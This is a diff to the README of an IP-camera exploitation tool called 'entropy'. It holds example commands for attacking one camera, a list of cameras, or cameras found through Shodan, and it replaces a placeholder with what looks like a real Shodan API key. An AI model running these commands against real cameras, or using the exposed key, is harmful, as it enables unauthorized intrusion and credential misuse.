@@ -104,17 +104,17 @@
 
 # Entropy exploit examples
 
-> If you want to exploit a local camera, run
+> Example of the exploiting a single camera
     
     entropy -b 1 -i 192.168.1.100:80 -v  
     
-> If you want to exploit cameras from list, run
+> Example of the exploiting cameras from a file
 
     entropy -b 2 -l iplist.txt -v
     
-> If you want to exploit cameras from database, run
+> Example of the exploiting cameras using shodan
 
-    entropy -b 2 -v --shodan <API key>
+    entropy -b 2 -v --shodan PSKINdQe1GyxGgecYz2191H2JoS9qvgD
 
 # Terms of use
 
